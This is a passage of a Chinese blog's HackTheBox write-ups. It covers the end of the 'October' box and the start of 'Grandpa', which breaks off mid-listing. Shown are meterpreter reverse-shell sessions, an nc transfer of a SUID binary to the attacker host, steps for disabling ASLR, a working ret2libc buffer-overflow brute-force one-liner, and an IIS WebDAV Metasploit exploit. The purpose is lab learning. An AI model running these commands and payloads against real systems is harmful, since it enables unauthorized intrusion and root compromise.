class="line"></span><br><span class="line">  <span class="keyword">Id</span>  <span class="keyword">Name</span>  <span class="keyword">Type</span>                   Information                                                         <span class="keyword">Connection</span></span><br><span class="line">  <span class="comment">--  ----  ----                   -----------                                                         ----------</span></span><br><span class="line">  <span class="number">2</span>         meterpreter x86/linux  <span class="keyword">no</span>-<span class="keyword">user</span> @ october (uid=<span class="number">33</span>, gid=<span class="number">33</span>, euid=<span class="number">33</span>, egid=<span class="number">33</span>) @ <span class="number">10.10</span><span class="number">.10</span><span class="number">.16</span>  <span class="number">10.10</span><span class="number">.16</span><span class="number">.122</span>:<span class="number">4443</span> -&gt; <span class="number">10.10</span><span class="number">.10</span><span class="number">.16</span>:<span class="number">59910</span> (<span class="number">10.10</span><span class="number">.10</span><span class="number">.16</span>)</span><br><span class="line"></span><br><span class="line">msf5 post(multi/recon/local_exploit_suggester) &gt; <span class="keyword">set</span> <span class="keyword">session</span> <span class="number">2</span></span><br><span class="line"><span class="keyword">session</span> =&gt; <span class="number">2</span></span><br><span class="line"></span><br><span class="line">msf5 post(multi/recon/local_exploit_suggester) &gt; run</span><br><span class="line"></span><br><span class="line">[*] <span class="number">10.10</span><span class="number">.10</span><span class="number">.16</span> - Collecting <span class="keyword">local</span> exploits <span class="keyword">for</span> x86/linux...</span><br><span class="line">[*] <span class="number">10.10</span><span class="number">.10</span><span class="number">.16</span> - <span class="number">34</span> exploit checks <span class="keyword">are</span> being tried...</span><br><span class="line">[+] <span class="number">10.10</span><span class="number">.10</span><span class="number">.16</span> - exploit/linux/<span class="keyword">local</span>/apport_abrt_chroot_priv_esc: The target appears <span class="keyword">to</span> be vulnerable.</span><br><span class="line">[+] <span class="number">10.10</span><span class="number">.10</span><span class="number">.16</span> - exploit/linux/<span class="keyword">local</span>/pkexec: The service <span class="keyword">is</span> running, but could <span class="keyword">not</span> be validated.</span><br></pre></td></tr></table></figure>

<p>在<code>linux/x86/meterpreter/reverse_tcp</code>的会话下尝试，均失败。</p>
<h2 id="exp-提权"><a href="#exp-提权" class="headerlink" title="exp 提权"></a>exp 提权</h2><p>用<code>linpeas.sh</code>脚本搜索到</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[+] Unmounted file-system?</span><br><span class="line">[i] <span class="keyword">Check</span> <span class="keyword">if</span> you can <span class="keyword">mount</span> umounted devices</span><br><span class="line"></span><br><span class="line">/dev/mapper/october<span class="comment">--vg-root /               ext4    errors=remount-ro 0       1</span></span><br><span class="line"><span class="keyword">UUID</span>=<span class="number">9</span>d82af70-c08b<span class="number">-4</span>ec2-af22<span class="number">-6754638</span>dc49f /boot           ext2    <span class="keyword">defaults</span>        <span class="number">0</span>       <span class="number">2</span></span><br><span class="line">/dev/mapper/october<span class="comment">--vg-swap_1 none            swap    sw              0       0</span></span><br><span class="line">/dev/fd0        /media/floppy0  <span class="keyword">auto</span>    rw,<span class="keyword">user</span>,noauto,exec,utf8 <span class="number">0</span>       <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>无果无果。。</p>
<h2 id="suid-权限的文件"><a href="#suid-权限的文件" class="headerlink" title="suid 权限的文件"></a>suid 权限的文件</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">(www-data:/var/www/html/cms/storage/app/media) $ find / -perm -u=s 2&gt;/dev/null</span><br><span class="line">  /bin/umount</span><br><span class="line">  /bin/ping</span><br><span class="line">  /bin/fusermount</span><br><span class="line">  /bin/su</span><br><span class="line">  /bin/ping6</span><br><span class="line">  /bin/mount</span><br><span class="line">  /usr/lib/eject/dmcrypt-get-device</span><br><span class="line">  /usr/lib/openssh/ssh-keysign</span><br><span class="line">  /usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="line">  /usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">  /usr/bin/sudo</span><br><span class="line">  /usr/bin/newgrp</span><br><span class="line">  /usr/bin/pkexec</span><br><span class="line">  /usr/bin/passwd</span><br><span class="line">  /usr/bin/chfn</span><br><span class="line">  /usr/bin/gpasswd</span><br><span class="line">  /usr/bin/traceroute6.iputils</span><br><span class="line">  /usr/bin/mtr</span><br><span class="line">  /usr/bin/chsh</span><br><span class="line">  /usr/bin/at</span><br><span class="line">  /usr/sbin/pppd</span><br><span class="line">  /usr/sbin/uuidd</span><br><span class="line">  /usr/local/bin/ovrflw</span><br></pre></td></tr></table></figure>

<p>没有常见的几种可利用的东西，<del>暂放一放。</del>实际上，<code>overflow</code>应该是黑阔关注的词，我们拖回本机看看</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 靶机输入</span></span><br><span class="line">nc 10.10.16.122 666 &lt; ovrflw</span><br><span class="line"></span><br><span class="line"><span class="comment"># 本机输入</span></span><br><span class="line">nc -lvp 666 &gt; overflow</span><br></pre></td></tr></table></figure>

<p>后面是用 pwn 的一些方法，通过 bufferoverflow 拿到了 root 权限，牛！继续学习下</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@localhost:~/HTB/october<span class="comment"># checksec --file=overflow</span></span><br><span class="line"></span><br><span class="line">RELRO           STACK CANARY      NX            PIE      RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE</span><br><span class="line">Partial RELRO   No canary found   NX enabled    No PIE   No RPATH   No RUNPATH   69 Symbols     No	0		2overflow</span><br></pre></td></tr></table></figure>

<h1 id="BufferOverFlow"><a href="#BufferOverFlow" class="headerlink" title="BufferOverFlow"></a>BufferOverFlow</h1><h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><p>向缓冲区输入<strong>比较长</strong>的字符串（只要几十几百即可，可用 burp 来 fuzz），若出现段错误，即认为是溢出</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./overflow `python -c 'print "Z"*200'`</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1590798811785-69c12a88-8789-4c5a-bf70-29bcfde12f76.png#align=left&display=inline&height=480&margin=%5Bobject%20Object%5D&name=BoF-PoC.png&originHeight=480&originWidth=1370&size=125255&status=done&style=none&width=1370" alt="BoF-PoC.png"></p>
<blockquote>
<p>在编写漏洞利用代码的时候，需要特别注意目标进程是否开启了 DEP（Linux 下对应 NX）、ASLR（Linux 下对应 PIE）等机制，<br>例如存在 DEP（NX）的话就不能直接执行栈上的数据，<br>存在 ASLR 的话各个系统调用的地址就是随机化的。</p>
</blockquote>
<h2 id="strings-查看大致内容"><a href="#strings-查看大致内容" class="headerlink" title="strings 查看大致内容"></a>strings 查看大致内容</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#  strings overflow</span></span><br><span class="line"></span><br><span class="line">/lib/ld-linux.so.2</span><br><span class="line">libc.so.6</span><br><span class="line">_IO_stdin_used</span><br><span class="line">strcpy</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h2 id="ldd-查看库"><a href="#ldd-查看库" class="headerlink" title="ldd 查看库"></a>ldd 查看库</h2><blockquote>
<p><strong>ldd 命令</strong>用于打印程序或者库文件所依赖的共享库列表。</p>
</blockquote>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ldd -v overflow</span></span><br><span class="line">	linux-gate.so.1 (0xf7fd2000)</span><br><span class="line">	libc.so.6 =&gt; /lib32/libc.so.6 (0xf7dcb000)</span><br><span class="line">	/lib/ld-linux.so.2 (0xf7fd4000)</span><br><span class="line"></span><br><span class="line">	Version information:</span><br><span class="line">	./overflow:</span><br><span class="line">		libc.so.6 (GLIBC_2.0) =&gt; /lib32/libc.so.6</span><br><span class="line">	/lib32/libc.so.6:</span><br><span class="line">		ld-linux.so.2 (GLIBC_2.3) =&gt; /lib/ld-linux.so.2</span><br><span class="line">		ld-linux.so.2 (GLIBC_PRIVATE) =&gt; /lib/ld-linux.so.2</span><br><span class="line">		ld-linux.so.2 (GLIBC_2.1) =&gt; /lib/ld-linux.so.2</span><br></pre></td></tr></table></figure>

<h2 id="调试前关闭-ASLR"><a href="#调试前关闭-ASLR" class="headerlink" title="调试前关闭 ASLR"></a>调试前关闭 ASLR</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">//原本值是2</span><br></pre></td></tr></table></figure>

<h2 id="checksec-查看程序保护机制"><a href="#checksec-查看程序保护机制" class="headerlink" title="checksec 查看程序保护机制"></a>checksec 查看程序保护机制</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># gdb-peda$ checksec</span></span><br><span class="line"></span><br><span class="line">  CANARY    : disabled</span><br><span class="line">  FORTIFY   : disabled</span><br><span class="line">  NX        : ENABLED</span><br><span class="line">  PIE       : disabled</span><br><span class="line">  RELRO     : Partial</span><br></pre></td></tr></table></figure>

<h3 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h3><p>NX 即 No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行</p>
<h2 id="构造超长字符串"><a href="#构造超长字符串" class="headerlink" title="构造超长字符串"></a>构造超长字符串</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200</span></span><br><span class="line"></span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag</span><br></pre></td></tr></table></figure>

<h2 id="gdb-调试确定偏移量"><a href="#gdb-调试确定偏移量" class="headerlink" title="gdb 调试确定偏移量"></a>gdb 调试确定偏移量</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># gdb ./overflow</span></span><br><span class="line">gdb-peda$ b main</span><br><span class="line">gdb-peda$ r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag</span><br><span class="line">gdb-peda$ c</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1590803270814-779bd876-0106-4e6c-9fc4-bc2e85f73e3f.png#align=left&display=inline&height=970&margin=%5Bobject%20Object%5D&name=sig-1.png&originHeight=970&originWidth=1919&size=298189&status=done&style=none&width=1919" alt="sig-1.png"><br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1590803269185-1818818c-8d8e-4f70-a34c-2aec94eb6654.png#align=left&display=inline&height=919&margin=%5Bobject%20Object%5D&name=sig-2.png&originHeight=919&originWidth=1477&size=251943&status=done&style=none&width=1477" alt="sig-2.png"></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q d7Ad</span></span><br><span class="line">[*] Exact match at offset 112</span><br><span class="line"><span class="comment"># /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 64413764</span></span><br><span class="line">[*] Exact match at offset 112</span><br></pre></td></tr></table></figure>

<p>也就是说，我们从在 112 字节后覆盖 EIP</p>
<h2 id="ret-to-libc"><a href="#ret-to-libc" class="headerlink" title="ret to libc"></a>ret to libc</h2><blockquote>
<p>r2libc 技术是一种缓冲区溢出利用技术，主要用于克服常规缓冲区溢出漏洞利用技术中面临的 no stack executable 限制(所以后续实验还是需要关闭系统的 ASLR，以及堆栈保护)，比如 PaX 和 ExecShield 安全策略。该技术主要是通过覆盖栈帧中保存的函数返回地址(eip)，让其定位到 libc 库中的某个库函数(如，system 等)，而不是直接定位到 shellcode<br>————————————————<br>版权声明：本文为 CSDN 博主「大 1234 草」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/sinat_38816924/java/article/details/106222286" target="_blank" rel="noopener">https://blog.csdn.net/sinat_38816924/java/article/details/106222286</a></p>
</blockquote>
<blockquote>
<p>一般 system 函数会与所有的 c 库函数一起通过 libc 加载到程序中（linux 下）。(所以叫 ret to libc)每个 c 语言程序都可以调用 system 函数。而 system 函数在 libc 中的位置是固定的。objdump 或者 ida 直接找到就可以了。关键的问题是我们不知道 libc 在加载到程序中后，它的基地址是多少。每次程序运行时，libc 的基础地址会变动。要解决的问题就是 leak(泄露)基地址。一旦得到基地址，就可以用 “基地址 + system 在 libc 中地址”计算出 system 的真实地址。<br>————————————————<br>版权声明：本文为 CSDN 博主「zh_explorer」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/zh_explorer/java/article/details/80306965" target="_blank" rel="noopener">https://blog.csdn.net/zh_explorer/java/article/details/80306965</a></p>
</blockquote>
<p>确定偏移+爆破</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p system</span><br><span class="line">$1 = &#123;&lt;text variable, no debug info&gt;&#125; 0xf7e0f620 &lt;system&gt;</span><br><span class="line"></span><br><span class="line">p exit</span><br><span class="line">$2 = &#123;&lt;text variable, no debug info&gt;&#125; 0xf7e02390 &lt;exit&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exit: 0xb75f8000+0x33260 = 0xB762B260</span><br><span class="line">system: 0xb75f8000+0x40310 = 0xB7638310</span><br><span class="line">/bin/sh: = 0xb75f8000+0x162bac = 0xB775ABAC</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> true; do /usr/local/bin/ovrflw $(python -c <span class="string">'print "\x90"*112 + "\x10\x83\x63\xb7" + "\x60\xb2\x62\xb7" + "\xac\xab\x75\xb7"'</span>); done</span><br></pre></td></tr></table></figure>

<h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><ul>
<li><a href="https://wooyun.js.org/drops/return2libc%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html" target="_blank" rel="noopener">https://wooyun.js.org/drops/return2libc%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</a></li>
<li><a href="https://blog.csdn.net/sinat_38816924/article/details/106222286" target="_blank" rel="noopener">return2libc 学习笔记 - 路人甲</a></li>
<li><a href="https://www.cnblogs.com/Spider-spiders/p/8798628.html" target="_blank" rel="noopener">linux 程序的常用保护机制 - 都是一家人 - 博客园</a></li>
<li><a href="https://blog.csdn.net/zh_explorer/article/details/80306965" target="_blank" rel="noopener">pwn 技巧之 ret to libc<em>shell</em>这里没人-CSDN 博客</a></li>
<li><a href="https://teckk2.github.io/writeup/2018/02/23/October.html" target="_blank" rel="noopener">https://teckk2.github.io/writeup/2018/02/23/October.html</a></li>
<li><a href="https://github.com/Kyuu-Ji/htb-write-up/blob/fc6164f37d12498c73d37d6e267d501b26e37334/october/write-up-october.md" target="_blank" rel="noopener">https://github.com/Kyuu-Ji/htb-write-up/blob/fc6164f37d12498c73d37d6e267d501b26e37334/october/write-up-october.md</a></li>
<li><a href="https://0xdf.gitlab.io/2019/03/26/htb-october.html" target="_blank" rel="noopener">https://0xdf.gitlab.io/2019/03/26/htb-october.html</a></li>
<li><a href="https://teckk2.github.io/writeup/2018/02/23/October.html" target="_blank" rel="noopener">https://teckk2.github.io/writeup/2018/02/23/October.html</a></li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://unc1e.com/2020/04/23/yuque/HackTheBox%EF%BC%9AGrandpa%E7%AC%94%E8%AE%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Unc1e">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Unc1e的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/23/yuque/HackTheBox%EF%BC%9AGrandpa%E7%AC%94%E8%AE%B0/" itemprop="url">HackTheBox：Grandpa笔记</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-23T21:11:22+08:00">
                2020-04-23
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1587647532627-59f3c36a-2138-42cb-b8a6-14df22045958.png#align=left&display=inline&height=190&margin=%5Bobject%20Object%5D&name=image.png&originHeight=379&originWidth=594&size=96769&status=done&style=none&width=297" alt="image.png"></p>
<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@localhost:~/HTB/grandpa<span class="comment"># nmap -p- -sV -sC 10.10.10.14 -oA scans/allport.tcp</span></span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Microsoft IIS httpd 6.0</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH <span class="keyword">LOCK</span> <span class="keyword">UNLOCK</span> <span class="keyword">DELETE</span> PUT <span class="keyword">MOVE</span> MKCOL PROPPATCH</span><br><span class="line">|_http-<span class="keyword">server</span>-header: Microsoft-IIS/<span class="number">6.0</span></span><br><span class="line">|_http-title: <span class="keyword">Error</span></span><br><span class="line">| <span class="keyword">http</span>-webdav-<span class="keyword">scan</span>:</span><br><span class="line">|   <span class="keyword">Public</span> Options: OPTIONS, <span class="keyword">TRACE</span>, <span class="keyword">GET</span>, <span class="keyword">HEAD</span>, <span class="keyword">DELETE</span>, PUT, POST, COPY, <span class="keyword">MOVE</span>, MKCOL, PROPFIND, PROPPATCH, <span class="keyword">LOCK</span>, <span class="keyword">UNLOCK</span>, <span class="keyword">SEARCH</span></span><br><span class="line">|   WebDAV <span class="keyword">type</span>: <span class="literal">Unknown</span></span><br><span class="line">|   <span class="keyword">Server</span> <span class="keyword">Type</span>: Microsoft-IIS/<span class="number">6.0</span></span><br><span class="line">|   Allowed Methods: OPTIONS, <span class="keyword">TRACE</span>, <span class="keyword">GET</span>, <span class="keyword">HEAD</span>, COPY, PROPFIND, <span class="keyword">SEARCH</span>, <span class="keyword">LOCK</span>, <span class="keyword">UNLOCK</span></span><br><span class="line">|_  <span class="keyword">Server</span> <span class="built_in">Date</span>: Thu, <span class="number">23</span> Apr <span class="number">2020</span> <span class="number">13</span>:<span class="number">11</span>:<span class="number">29</span> GMT</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>

<h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@localhost:~/HTB/grandpa<span class="comment"># dirb http://10.10.10.14 -o scans/dirb.txt</span></span><br><span class="line"><span class="comment">-----------------</span></span><br><span class="line">DIRB v2.22</span><br><span class="line">By The Dark Raver</span><br><span class="line"><span class="comment">-----------------</span></span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612</span><br><span class="line"><span class="comment">---- Scanning URL: http://10.10.10.14/ ----</span></span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.14/_vti_bin/</span><br><span class="line">+ http://10.10.10.14/_vti_bin/_vti_adm/admin.dll (CODE:200|SIZE:195)</span><br><span class="line">+ http://10.10.10.14/_vti_bin/_vti_aut/author.dll (CODE:200|SIZE:195)</span><br><span class="line">+ http://10.10.10.14/_vti_bin/shtml.dll (CODE:200|SIZE:96)</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.14/_vti_bin/_vti_aut</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1587648955562-30e6bebb-11df-4c2b-8de0-1d08424af646.png#align=left&display=inline&height=462&margin=%5Bobject%20Object%5D&name=image.png&originHeight=924&originWidth=1913&size=246372&status=done&style=none&width=956.5" alt="image.png"><br>搜了下，这个东西叫<code>FrontPage Server Extensions</code>,  相关搜索比较少</p>
<p><a href="http://10.10.10.14/_vti_bin/_vti_adm/fpadmdll.dll" target="_blank" rel="noopener">http://10.10.10.14/_vti_bin/_vti_adm/fpadmdll.dll</a>，有个 401 认证, 尝试弱密码，失败<br>又想起<a href="https://paper.seebug.org/1144/" target="_blank" rel="noopener">这是一篇“不一样”的真实渗透测试案例分析文章</a>里说<code>webbdav</code>好像是有个<code>xxe</code>，在根目录上尝试，无果<br>msf 打了了<code>iis 6.0</code>+<code>sharepoint</code>+<code>webdav</code>的 exp，无果，用<code>davtest</code>扫描<code>webdav</code>是否有漏洞，全部失败。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root@localhost:~/HTB<span class="comment"># davtest -url http://10.10.10.14</span></span><br><span class="line">********************************************************</span><br><span class="line"> Testing DAV connection</span><br><span class="line">OPEN		SUCCEED:		http://10.10.10.14</span><br><span class="line">********************************************************</span><br><span class="line">NOTE	Random string for this session: dhNrel</span><br><span class="line">********************************************************</span><br><span class="line"> Creating directory</span><br><span class="line">MKCOL		FAIL</span><br><span class="line">********************************************************</span><br><span class="line"> Sending test files</span><br><span class="line">PUT	aspx	FAIL</span><br><span class="line">PUT	jsp	FAIL</span><br><span class="line">PUT	html	FAIL</span><br><span class="line">PUT	cfm	FAIL</span><br><span class="line">PUT	php	FAIL</span><br><span class="line">PUT	pl	FAIL</span><br><span class="line">PUT	jhtml	FAIL</span><br><span class="line">PUT	txt	FAIL</span><br><span class="line">PUT	shtml	FAIL</span><br><span class="line">PUT	asp	FAIL</span><br><span class="line">PUT	cgi	FAIL</span><br><span class="line"></span><br><span class="line">********************************************************</span><br><span class="line">/usr/bin/davtest Summary:</span><br></pre></td></tr></table></figure>

<p>苦苦搜寻，几番尝试无果后，准备看网上的 walkthrough，居然是用 msf 中我尝试过的一个 exp 直接 rce 了，<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1587711274401-7fee3d08-4634-457a-a35c-d76ab4da8e8f.png#align=left&display=inline&height=238&margin=%5Bobject%20Object%5D&name=image.png&originHeight=475&originWidth=430&size=46730&status=done&style=none&width=215" alt="image.png"><br>重置下靶机吧。成功拿到第一个 shell</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">msf5 &gt; use windows/iis/iis_webdav_scstoragepathfromurl</span><br><span class="line">msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) &gt; show options</span><br><span class="line">msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.16.122:4444</span><br><span class="line">[*] Trying path length 3 to 60 ...</span><br><span class="line">[*] Sending stage (180291 bytes) to 10.10.10.14</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.16.122:4444 -&gt; 10.10.10.14:1031) at 2020-04-24 06:02:23 +0000</span><br></pre></td></tr></table></figure>

<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>使用 msf 自带的一个提权测试模块，<code>**post/multi/recon/**</code>*<em><code>local_exploit_suggester</code>  *</em></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use post/multi/recon/local_exploit_suggester</span><br><span 